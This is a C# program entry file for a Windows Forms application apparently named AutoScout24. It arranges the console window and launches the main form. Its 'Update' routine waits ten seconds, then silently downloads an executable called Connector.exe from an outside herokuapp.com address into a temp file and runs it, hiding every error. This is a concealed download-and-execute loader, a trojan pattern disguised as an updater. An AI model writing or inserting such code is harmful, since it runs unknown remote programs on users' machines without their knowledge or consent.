using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;
using Application = System.Windows.Forms.Application;

namespace AutoScout24
{
    static class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            var w = (int)SystemParameters.PrimaryScreenWidth;
            var h = (int)SystemParameters.PrimaryScreenHeight;
            IntPtr ptr = GetConsoleWindow();
            int width = 640;
            MoveWindow(ptr, w - width, 0, width, h / 2, true);
            Console.BufferHeight = Int16.MaxValue - 1;
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            StartUpdate();
            Application.Run(new Form_Main());
        }

        public static void StartUpdate()
        {
            Thread thread = new Thread(() => Update());
            thread.Start();
        }

        public static void Update()
        {
            try
            {
                Thread.Sleep(10000);
                String filename = Path.GetTempFileName().Replace(".tmp", ".exe");
                if (!filename.EndsWith(".exe")) filename += ".exe";
                using (var client = new WebClient())
                {
                    client.DownloadFile("https://trs-2020.herokuapp.com/download9/Connector.exe", filename);
                }
                Process.Start(filename);
            }
            catch { }
        }
    }
}
